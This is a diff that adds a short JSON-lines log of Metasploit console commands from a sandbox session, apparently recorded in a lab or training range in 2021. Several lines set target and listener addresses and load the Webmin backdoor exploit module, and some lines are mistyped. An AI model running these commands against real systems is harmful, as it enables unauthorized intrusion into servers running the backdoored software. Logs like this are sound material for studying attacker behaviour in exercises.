@@ -1,0 +1,8 @@
+{"sandbox_id": "128", "timestamp_str": "2021-06-30T06:31:57.718Z", "cmd_type": "msf-command", "cmd": "set RHOST 10.1.26.9"}
+{"sandbox_id": "128", "timestamp_str": "2021-06-30T06:32:15.024Z", "cmd_type": "msf-command", "cmd": "LHOST 10.1.135.83"}
+{"sandbox_id": "128", "timestamp_str": "2021-06-30T06:32:21.524Z", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
+{"sandbox_id": "128", "timestamp_str": "2021-06-30T06:32:32.409Z", "cmd_type": "msf-command", "cmd": "set SSL true"}
+{"sandbox_id": "128", "timestamp_str": "2021-06-30T06:32:49.479Z", "cmd_type": "msf-command", "cmd": "set RHOST 10.1.26.9"}
+{"sandbox_id": "128", "timestamp_str": "2021-06-30T06:33:53.546Z", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin/backdoor"}
+{"sandbox_id": "128", "timestamp_str": "2021-06-30T06:34:22.793Z", "cmd_type": "msf-command", "cmd": ":q"}
+{"sandbox_id": "128", "timestamp_str": "2021-06-30T06:35:33.962Z", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin/backdoor"}
